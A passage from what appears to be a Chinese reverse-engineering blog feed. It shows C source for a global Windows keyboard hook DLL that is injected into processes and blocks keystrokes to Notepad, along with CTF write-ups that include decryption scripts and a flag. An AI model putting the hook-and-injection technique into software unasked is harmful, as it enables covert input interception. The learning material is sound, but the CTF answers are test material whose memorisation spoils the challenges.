WaitForSingleObject(hThread, <span class="number">60</span>*<span class="number">1000</span>);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">    print_console(<span class="string">&quot;main() end\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="调试TLS回调函数"><a href="#调试TLS回调函数" class="headerlink" title="调试TLS回调函数"></a>调试TLS回调函数</h5><p>直接在运行前设置调试选项</p><p><img src="/./../images/image-20221221222931558.png" alt="image-20221221222931558"></p><p>添加TLS这里不做阐述</p><hr><h1 id="keyboard-hooking"><a href="#keyboard-hooking" class="headerlink" title="keyboard hooking"></a>keyboard hooking</h1><p>消息钩取工作原理</p><p><img src="/./../images/image-20221222102644542.png" alt="image-20221222102644542"></p><p>使用SetWindowsHookEx()可以实现消息钩子，钩子函数需要存在于dll文件中，由操作系统调用回调函数</p><p>API定义：</p><p><img src="/./../images/image-20221222103023824.png" alt="image-20221222103023824"></p><p>在某进程拥有消息，操作系统就会将dll注入进程序中，实现消息钩取</p><p>只需要一个程序加载安装钩子所在的dll程序，然后SetWindowsHookEx()注册钩子，操作系统就会检测每一个程序的行为，一旦发生键盘输入，就将dll文件注入。</p><p>加载dll注册hook实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;conio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DEF_DLL_NAME<span class="string">&quot;KeyHook.dll&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DEF_HOOKSTART<span class="string">&quot;HookStart&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>DEF_HOOKSTOP<span class="string">&quot;HookStop&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HMODULEhDll = <span class="literal">NULL</span>;</span><br><span class="line">PFN_HOOKSTARTHookStart = <span class="literal">NULL</span>;</span><br><span class="line">PFN_HOOKSTOPHookStop = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span>ch = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// KeyHook.dll 肺爹</span></span><br><span class="line">hDll = LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span>( hDll == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary(%s) failed!!! [%d]&quot;</span>, DEF_DLL_NAME, GetLastError());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// export 窃荐 林家 掘扁</span></span><br><span class="line">HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);</span><br><span class="line">HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 饶欧 矫累</span></span><br><span class="line">HookStart();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 荤侩磊啊 &#x27;q&#x27; 甫 涝仿且 锭鳖瘤 措扁</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;press &#x27;q&#x27; to quit!\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>( _getch() != <span class="string">&#x27;q&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 饶欧 辆丰</span></span><br><span class="line">HookStop();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// KeyHook.dll 攫肺爹</span></span><br><span class="line">FreeLibrary(hDll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dll代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROCESS_NAME<span class="string">&quot;notepad.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">HWND g_hWnd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span>( dwReason )</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"><span class="type">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( nCode &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// bit 31 : 0 =&gt; press, 1 =&gt; release</span></span><br><span class="line"><span class="keyword">if</span>( !(lParam &amp; <span class="number">0x80000000</span>) )</span><br><span class="line">&#123;</span><br><span class="line">GetModuleFileNameA(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">p = <span class="built_in">strrchr</span>(szPath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 泅犁 橇肺技胶 捞抚阑 厚背秦辑 父距 notepad.exe 扼搁 0 酒囱 蔼阑 府畔窃</span></span><br><span class="line">            <span class="comment">// =&gt; 0 酒囱 蔼阑 府畔窍搁 皋矫瘤绰 促澜栏肺 傈崔登瘤 臼澜</span></span><br><span class="line"><span class="keyword">if</span>( !_stricmp(p + <span class="number">1</span>, DEF_PROCESS_NAME) )</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 老馆利牢 版快俊绰 CallNextHookEx() 甫 龋免窍咯</span></span><br><span class="line">    <span class="comment">//   览侩橇肺弊伐 (趣篮 促澜 扰) 栏肺 皋矫瘤甫 傈崔窃</span></span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( g_hHook )</span><br><span class="line">&#123;</span><br><span class="line">UnhookWindowsHookEx(g_hHook);</span><br><span class="line">g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h5 id="调试hook"><a href="#调试hook" class="headerlink" title="调试hook"></a>调试hook</h5><p>用字符串搜索直接定位到main函数</p><p><img src="/./../images/image-20221222110634215.png" alt="image-20221222110634215"></p><p>上面得到hookStart地址，然后call，F7直接步入就能进入hookstart函数</p><p><img src="/./../images/image-20221222111024672.png" alt="image-20221222111024672"></p><p>这里就是dll中注册键盘hook</p><p>直接根据注册时得到的地址进行跳转就能得到hook函数</p><p><img src="/./../images/image-20221222111311777.png" alt="image-20221222111311777"></p><p>也可以打开notepad，进行附加attach，先摁F9，让hook注册成功</p><p>然后在新加一个模块处停止，option设置</p><p><img src="/./../images/image-20221222111708005.png" alt="image-20221222111708005"></p><p>附加后在键盘输入字母，od会立马断住。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;TLS and keyboard hooking&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>syc_level7</title>
    <link href="https://pa1r0t.github.io/2022/12/20/syc-level7/"/>
    <id>https://pa1r0t.github.io/2022/12/20/syc-level7/</id>
    <published>2022-12-20T03:30:36.000Z</published>
    <updated>2022-12-20T04:11:42.019Z</updated>
    
    <content type="html"><![CDATA[<p>syc_level7</p><p>这种异常处理的catch代码一开始不会找，后来看了三叶草的战队的解答才知道怎么操作</p><span id="more"></span><p>这里有四个throw块，要找到对应catch代码，然后jmp过去就能看见源码，三叶草那边的解答是手撸汇编代码，说实话这种分析太慢，而且容易出错，还不如让ida来帮我们分析</p><p><img src="/./../images/image-20221220115828084.png" alt="image-20221220115828084"></p><p>转到卡片形式汇编代码，有这种标志的就是catch代码</p><p><img src="/./../images/image-20221220115956022.png" alt="image-20221220115956022"></p><p>然后将所有的catch块打上断点</p><p><img src="/./../images/image-20221220120047338.png" alt="image-20221220120047338"></p><p>然后在throw代码之前也都打上断点</p><p><img src="/./../images/image-20221220120159946.png" alt="image-20221220120159946"></p><p>然后，运行程序找到，各个throw对应的catch块</p><p>修改throw代码为jmp 对应catch地址，直接看到源码</p><p><img src="/./../images/image-20221220113600556.png" alt="image-20221220113600556"></p><p>这里随机数，大循环32次每一次要重置srand，小循环四次，所以只需要输出4个随机数即可</p><p>这里用c语言中的srand代码生成随机数，值得注意的是，&#x3D;&#x3D;我在windows上用c语言跑，跑出来的随机数根本不对。要在linux上面跑才行&#x3D;&#x3D;</p><p><img src="/./../images/image-20221220114740283.png" alt="image-20221220114740283"></p><p><img src="/./../images/image-20221220114707904.png" alt="image-20221220114707904"></p><p>这里根据随机数，标上代码块的执行顺序</p><p><img src="/./../images/image-20221220114941422.png" alt="image-20221220114941422"></p><p>最后python伪代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0xA3A7C060</span>, <span class="number">0xEE6E5485</span>, <span class="number">0x244B2655</span>, <span class="number">0x318482D9</span>]</span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v11 += delta</span><br><span class="line">    v12 += delta</span><br><span class="line">    v7 += ((v8 &gt;&gt; <span class="number">5</span>) + <span class="number">6</span>) ^ (v8 + v11) ^ (<span class="number">16</span> * v8 + <span class="number">8</span>) ^ (i + v11)</span><br><span class="line">    v9 += ((v10 &gt;&gt; <span class="number">5</span>) + <span class="number">6</span>) ^ (v10 + v12) ^ (<span class="number">16</span> * v10 + <span class="number">8</span>) ^ (i + v12)</span><br><span class="line">    v8 += ((v7 &gt;&gt; <span class="number">5</span>) + <span class="number">7</span>) ^ (v7 + v11) ^ (<span class="number">16</span> * v7 + <span class="number">9</span>) ^ (i + v11)</span><br><span class="line">    v10 += ((v9 &gt;&gt; <span class="number">5</span>) + <span class="number">7</span>) ^ (v9 + v12) ^ (<span class="number">16</span> * v9 + <span class="number">9</span>) ^ (i + v12)</span><br><span class="line">v19 = v7 ^ HIBYTE(delta)</span><br><span class="line">v20 = v8 ^ BYTE2(delta)</span><br><span class="line">v21 = v9 ^ BYTE1(delta)</span><br><span class="line">v22 = v10 ^ (unsigned __int8)delta</span><br></pre></td></tr></table></figure><p>然后根据这个代码写出解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lesson7</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">enc = [<span class="number">0xA3A7C060</span>, <span class="number">0xEE6E5485</span>, <span class="number">0x244B2655</span>, <span class="number">0x318482D9</span>]</span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br><span class="line">s = (delta*<span class="number">32</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line">v7 = enc[<span class="number">0</span>]^<span class="number">0x9e</span></span><br><span class="line">v8 = enc[<span class="number">1</span>]^<span class="number">0x37</span></span><br><span class="line">v9 = enc[<span class="number">2</span>]^<span class="number">0x79</span></span><br><span class="line">v10 = enc[<span class="number">3</span>]^<span class="number">0xb9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    v10 -= ((v9 &gt;&gt; <span class="number">5</span>) + <span class="number">7</span>) ^ (v9 + s) ^ (<span class="number">16</span> * v9 + <span class="number">9</span>) ^ (i + s)</span><br><span class="line">    v10 = v10&amp;<span class="number">0xffffffff</span></span><br><span class="line">    v8 -= ((v7 &gt;&gt; <span class="number">5</span>) + <span class="number">7</span>) ^ (v7 + s) ^ (<span class="number">16</span> * v7 + <span class="number">9</span>) ^ (i + s)</span><br><span class="line">    v8 = v8&amp;<span class="number">0xffffffff</span></span><br><span class="line">    v9 -= ((v10 &gt;&gt; <span class="number">5</span>) + <span class="number">6</span>) ^ (v10 + s) ^ (<span class="number">16</span> * v10 + <span class="number">8</span>) ^ (i + s)</span><br><span class="line">    v9 = v9&amp;<span class="number">0xffffffff</span></span><br><span class="line">    v7 -= ((v8 &gt;&gt; <span class="number">5</span>) + <span class="number">6</span>) ^ (v8 + s) ^ (<span class="number">16</span> * v8 + <span class="number">8</span>) ^ (i + s)</span><br><span class="line">    v7 = v7&amp;<span class="number">0xffffffff</span></span><br><span class="line">    s = (s-delta)&amp;<span class="number">0xffffffff</span></span><br><span class="line">enc = [v7,v8,v9,v10]</span><br><span class="line">flag = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(x)[<span class="number">2</span>:],enc)),<span class="number">16</span>)</span><br><span class="line">long_to_bytes(flag)</span><br><span class="line"><span class="comment">#SYC&#123;ediGegTEaEi&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;syc_level7&lt;/p&gt;
&lt;p&gt;这种异常处理的catch代码一开始不会找，后来看了三叶草的战队的解答才知道怎么操作&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>syc_level5</title>
    <link href="https://pa1r0t.github.io/2022/12/19/syc-level5/"/>
    <id>https://pa1r0t.github.io/2022/12/19/syc-level5/</id>
    <published>2022-12-19T13:02:09.000Z</published>
    <updated>2022-12-19T13:11:09.681Z</updated>
    
    <content type="html"><![CDATA[<p>emmmmmmmmmmm,第一次做到魔改aes，有点激动记录一下吧</p><span id="more"></span><ol><li><p>魔改AES     </p><p><img src="/./../images/image-20221219210943381.png" alt="image-20221219210943381">       </p></li><li><p>这里做21次操作。但是无列混淆 <img src="/./../images/image-20221219210954851.png" alt="image-20221219210954851"></p></li><li><p>第一次做这种魔改aes，逆着就是先行移位，原先怎么移动，就逆回去 <img src="/./../images/image-20221219211019386.png" alt="image-20221219211019386"></p></li><li><p>然后再字节替换，也可以逆 </p></li><li><p>然后再轮密钥加，这个要从后往前，不然会影响字节替换，字节替换是必须要有顺序的 </p></li><li><p>最后就是每一个密文块的初始异或，该题除了第一块，其他都是拿密文块作为密匙</p></li></ol><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lesson5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">row_re</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="comment"># 第二行</span></span><br><span class="line">    v1 = a1[<span class="number">13</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">13</span>+i*<span class="number">16</span>] = a1[<span class="number">9</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">9</span>+i*<span class="number">16</span>] = a1[<span class="number">5</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">5</span>+i*<span class="number">16</span>] = a1[<span class="number">1</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">1</span>+i*<span class="number">16</span>] = v1</span><br><span class="line">    <span class="comment"># 第三行 不变</span></span><br><span class="line">    v2 = a1[<span class="number">2</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">2</span>+i*<span class="number">16</span>] = a1[<span class="number">10</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">10</span>+i*<span class="number">16</span>] = v2</span><br><span class="line">    v3 = a1[<span class="number">6</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">6</span>+i*<span class="number">16</span>] = a1[<span class="number">14</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">14</span>+i*<span class="number">16</span>] = v3</span><br><span class="line">    <span class="comment"># 第四行</span></span><br><span class="line">    v4 = a1[<span class="number">15</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">15</span>+i*<span class="number">16</span>] = a1[<span class="number">3</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">3</span>+i*<span class="number">16</span>] = a1[<span class="number">7</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">7</span>+i*<span class="number">16</span>] = a1[<span class="number">11</span>+i*<span class="number">16</span>]</span><br><span class="line">    a1[<span class="number">11</span>+i*<span class="number">16</span>] = v4</span><br><span class="line">    </span><br><span class="line">a1 = [<span class="number">0xF8</span>, <span class="number">0x88</span>, <span class="number">0x9D</span>, <span class="number">0x31</span>, <span class="number">0xC7</span>, <span class="number">0x24</span>, <span class="number">0xD5</span>, <span class="number">0xF9</span>, <span class="number">0x45</span>, <span class="number">0x28</span>, <span class="number">0x9B</span>, <span class="number">0x7D</span>, <span class="number">0x42</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0x5F</span>, <span class="number">0x1E</span>, <span class="number">0x1C</span>, <span class="number">0x43</span>, <span class="number">0xE9</span>, <span class="number">0x1E</span>, <span class="number">0xE1</span>, <span class="number">0xB9</span>, <span class="number">0xBD</span>, <span class="number">0x85</span>, <span class="number">0x5B</span>, <span class="number">0x7A</span>, <span class="number">0x39</span>, <span class="number">0xDE</span>, <span class="number">0xF6</span>, <span class="number">0xA7</span>, <span class="number">0xB8</span>, <span class="number">0xF5</span>, <span class="number">0xD2</span>, <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xD9</span>, <span class="number">0xA0</span>, <span class="number">0x13</span>, <span class="number">0xF3</span>, <span class="number">0x43</span>, <span class="number">0xEF</span>, <span class="number">0xB2</span>, <span class="number">0x8A</span>]</span><br><span class="line">key_t = [<span class="number">0x58</span>, <span class="number">0x2F</span>, <span class="number">0x36</span>, <span class="number">0xDD</span>, <span class="number">0x92</span>, <span class="number">0xF2</span>, <span class="number">0x79</span>, <span class="number">0x09</span>, <span class="number">0xC8</span>, <span class="number">0x73</span>, <span class="number">0x6F</span>, <span class="number">0x0A</span>, <span class="number">0x36</span>, <span class="number">0x14</span>, <span class="number">0x6F</span>, <span class="number">0x43</span>, <span class="number">0xB7</span>, <span class="number">0x1A</span>, <span class="number">0x21</span>, <span class="number">0xD0</span>, <span class="number">0x25</span>, <span class="number">0xE8</span>, <span class="number">0x58</span>, <span class="number">0xD9</span>, <span class="number">0xED</span>, <span class="number">0x9B</span>, <span class="number">0x37</span>, <span class="number">0xD3</span>, <span class="number">0xDB</span>, <span class="number">0x8F</span>, <span class="number">0x58</span>, <span class="number">0x90</span>, <span class="number">0x55</span>, <span class="number">0x7D</span>, <span class="number">0x4C</span>, <span class="number">0x5C</span>, <span class="number">0x70</span>, <span class="number">0x95</span>, <span class="number">0x14</span>, <span class="number">0x85</span>, <span class="number">0x9D</span>, <span class="number">0x0E</span>, <span class="number">0x23</span>, <span class="number">0x56</span>, <span class="number">0x46</span>, <span class="number">0x81</span>, <span class="number">0x7B</span>, <span class="number">0xC6</span>, <span class="number">0x6C</span>, <span class="number">0xF6</span>, <span class="number">0x8D</span>, <span class="number">0x4F</span>, <span class="number">0x1C</span>, <span class="number">0x63</span>, <span class="number">0x99</span>, <span class="number">0xCA</span>, <span class="number">0x81</span>, <span class="number">0x6D</span>, <span class="number">0xBA</span>, <span class="number">0x9C</span>, <span class="number">0xC7</span>, <span class="number">0xEC</span>, <span class="number">0xC1</span>, <span class="number">0x5A</span>, <span class="number">0xA5</span>, <span class="number">0x79</span>, <span class="number">0x86</span>, <span class="number">0x50</span>, <span class="number">0xB9</span>, <span class="number">0x1A</span>, <span class="number">0x1F</span>, <span class="number">0x9A</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0xA5</span>, <span class="number">0x06</span>, <span class="number">0xFF</span>, <span class="number">0x9B</span>, <span class="number">0x64</span>, <span class="number">0x5C</span>, <span class="number">0x10</span>, <span class="number">0xBF</span>, <span class="number">0x28</span>, <span class="number">0x66</span>, <span class="number">0xA9</span>, <span class="number">0xA5</span>, <span class="number">0x37</span>, <span class="number">0xFC</span>, <span class="number">0x91</span>, <span class="number">0xD2</span>, <span class="number">0x92</span>, <span class="number">0xFA</span>, <span class="number">0x6E</span>, <span class="number">0x49</span>, <span class="number">0xF6</span>, <span class="number">0xA6</span>, <span class="number">0x42</span>, <span class="number">0xD6</span>, <span class="number">0x3C</span>, <span class="number">0x5E</span>, <span class="number">0xEB</span>, <span class="number">0x73</span>, <span class="number">0x0B</span>, <span class="number">0xA2</span>, <span class="number">0x7A</span>, <span class="number">0xA1</span>, <span class="number">0x99</span>, <span class="number">0x58</span>, <span class="number">0x14</span>, <span class="number">0xE8</span>, <span class="number">0x6F</span>, <span class="number">0xFE</span>, <span class="number">0x1D</span>, <span class="number">0xE3</span>, <span class="number">0x3A</span>, <span class="number">0xB3</span>, <span class="number">0xF6</span>, <span class="number">0x90</span>, <span class="number">0x31</span>, <span class="number">0x11</span>, <span class="number">0x8C</span>, <span class="number">0x31</span>, <span class="number">0xA8</span>, <span class="number">0x49</span>, <span class="number">0x98</span>, <span class="number">0xD9</span>, <span class="number">0xC7</span>, <span class="number">0xB7</span>, <span class="number">0x66</span>, <span class="number">0xFC</span>, <span class="number">0xE2</span>, <span class="number">0x77</span>, <span class="number">0x90</span>, <span class="number">0x6C</span>, <span class="number">0xD3</span>, <span class="number">0x66</span>, <span class="number">0x1C</span>, <span class="number">0x5D</span>, <span class="number">0x7B</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, <span class="number">0x84</span>, <span class="number">0xBC</span>, <span class="number">0x98</span>, <span class="number">0x70</span>, <span class="number">0x64</span>, <span class="number">0x26</span>, <span class="number">0x57</span>, <span class="number">0xE0</span>, <span class="number">0x08</span>, <span class="number">0xF5</span>, <span class="number">0x31</span>, <span class="number">0xFC</span>, <span class="number">0x55</span>, <span class="number">0x8E</span>, <span class="number">0x1E</span>, <span class="number">0x78</span>, <span class="number">0xD1</span>, <span class="number">0x32</span>, <span class="number">0x86</span>, <span class="number">0x36</span>, <span class="number">0xC2</span>, <span class="number">0x96</span>, <span class="number">0xDE</span>, <span class="number">0xD6</span>, <span class="number">0xCA</span>, <span class="number">0x63</span>, <span class="number">0xEF</span>, <span class="number">0x2A</span>, <span class="number">0x9F</span>, <span class="number">0xED</span>, <span class="number">0xF1</span>, <span class="number">0x52</span>, <span class="number">0x4E</span>, <span class="number">0xDF</span>, <span class="number">0x77</span>, <span class="number">0x63</span>, <span class="number">0xB1</span>, <span class="number">0xF2</span>, <span class="number">0x20</span>, <span class="number">0xB5</span>, <span class="number">0x7B</span>, <span class="number">0x91</span>, <span class="number">0xCF</span>, <span class="number">0x9F</span>, <span class="number">0xE4</span>, <span class="number">0x7C</span>, <span class="number">0x3E</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span 